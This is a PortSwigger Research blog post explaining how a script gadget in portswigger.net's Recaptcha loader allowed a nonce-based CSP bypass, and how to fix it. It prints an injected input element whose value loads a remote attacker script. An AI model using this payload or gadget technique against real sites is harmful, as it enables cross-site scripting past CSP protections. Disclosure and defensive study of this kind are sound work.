---
source: portswigger-research
source_url: https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis
title: "Hunting nonce-based CSP bypasses with dynamic analysis | PortSwigger Research"
published: 2021-09-17T14:00:00
description: "You might recall our post on a CSP bypass in PayPal; they used an allow list policy and we demonstrated how that was insecure but what about the other side of the coin? Nonce based policies are more s"
---

# Hunting nonce-based CSP bypasses with dynamic analysis

![Gareth Heyes](https://portswigger.net/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](https://portswigger.net/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

- **Published:** Friday, 17 September 2021 at 14:00 UTC

- **Updated:** Friday, 17 September 2021 at 14:00 UTC


![A safe dial showing a random token around it](https://portswigger.net/cms/images/5c/a1/e6fa-article-nonce-based-csp-bypasses-article.jpg)

You might recall our post on a [CSP bypass in PayPal](https://portswigger.net/research/finding-dom-polyglot-xss-in-paypal-the-easy-way); they used an allow list policy and we demonstrated how that was insecure but what about the other side of the coin? Nonce based policies are more secure right? Well, nonce based policies are definitely more secure if you have high confidence that your JavaScript contains no bugs. But these bugs can be subtle so you might not notice.

Nonce based policies use a random token assigned to an attribute to determine if the script can execute. The idea is an attacker can't discover this random token and therefore won't be able to inject it and therefore can't execute scripts.

For example this script would be allowed because "random-token" would be a randomized token that the [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) has allowed:

`<script nonce="random-token">`

Whereas in this case the attacker has injected their script but does not know the randomized token and therefore the script won't execute.

`<script nonce="foo">`

[Script gadgets](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf) are some functionality on a site that allows you to execute JavaScript in a different way than you would normally. This can enable you to bypass the CSP since the gadget is usually allowed to execute JavaScript.

Our head of the scanner team [Alex Borshik](https://twitter.com/AlexBorshik) decided to run a routine scan of [portswigger.net](https://portswigger.net/) and our dynamic analysis flagged up an interesting issue. He passed the issue over to me and I had a quick look to see what was going on:

![Burp Suite dynamic analysis screenshot](https://portswigger.net/cms/images/fc/68/73d5-article-dynamic-analysis-screenshot.jpg)

I took the stack trace from dynamic analysis and pasted into the Chrome console to show the exact lines of code:

`var t = document.querySelector("[id^='RecaptchaClientUrl-']").value
      , i = document.querySelector("[id^='RecaptchaClientSecret-']").value
      , n = document.createElement("script");
    n.id = "RecaptchaScript";
    n.src = t + i;`

[Burp scanner](https://portswigger.net/burp/vulnerability-scanner) had spotted that the value of an input element was being used to control a script URL.This made the Recaptcha script we'd written vulnerable. The gadget in this case would be the input element and its value property.

This code uses a query selector to get the Recaptcha Client Url. The problem is that if an attacker has an injection vulnerability that occurs before the querySelector's target they can inject a malicious element with the ID "RecaptchaClientUrl-'' and hijack the querySelector's results.

The reason for this is document.querySelector will return the first element that matches the querySelector so what dynamic analysis flagged up was an actual nonce based CSP bypass. This is demonstrated with the following:

`<input id="RecaptchaClientUrl-" value="//portswigger-labs.net/xss/xss.js" />`

The input element is found using the querySelector and then the value of the input element is read and assigned to a script src attribute causing the attacker's script to be executed.

### Conclusion

You have to have high confidence that your JavaScript doesn't contain bugs like this because an attacker can abuse them to gain control over your scripts. The best fix for this issue is to avoid giving an attacker control over the URL, so specifying a static string to the script's location would prevent this issue.

Nonce based policies are definitely more secure than using an allow list. However, care needs to be taken when writing JavaScript so it doesn't expose your site to subtle gadgets that an attacker can use to side step your policy.

[csp](https://portswigger.net/research/csp) [XSS](https://portswigger.net/research/cross-site-scripting-research)

[Back to all articles](https://portswigger.net/research/articles)

## Related Research

[**Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes** 03 September 2025Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes) [**Stealing HttpOnly cookies with the cookie sandwich technique** 22 January 2025Stealing HttpOnly cookies with the cookie sandwich technique](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) [**Bypassing WAFs with the phantom $Version cookie** 04 December 2024Bypassing WAFs with the phantom $Version cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie) [**Concealing payloads in URL credentials** 23 October 2024Concealing payloads in URL credentials](https://portswigger.net/research/concealing-payloads-in-url-credentials)